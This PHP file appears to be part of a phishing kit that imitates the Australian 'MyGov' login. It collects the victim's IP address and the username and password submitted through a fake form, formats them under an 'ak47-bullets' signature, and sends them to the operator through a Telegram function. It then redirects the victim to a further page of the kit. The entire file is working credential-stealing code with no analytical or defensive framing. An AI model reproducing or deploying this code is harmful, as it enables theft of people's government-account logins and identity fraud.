<?php

require_once 'telegram.php';


$ip = getenv("REMOTE_ADDR");

          if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }

   
            $Ak47 .= "𝘔𝘺𝘎𝘰𝘷-🇦🇺|𝘓𝘖𝘎𝘐𝘕|".$ip."\n";
            $Ak47 .= "┌─╼╼ ".$_POST['usr']."\n";
            $Ak47 .= "└─╼╼ ".$_POST['pwd']."\n";
            $Ak47 .= "▬▬▬▬▬▬▬▬▬▬\n";
            $Ak47 .= "ᴀᴋ47-ʙᴜʟʟᴇᴛs\n";

            

             telegram_send(urlencode($Ak47));
header("Location: ../add.php");


 ?>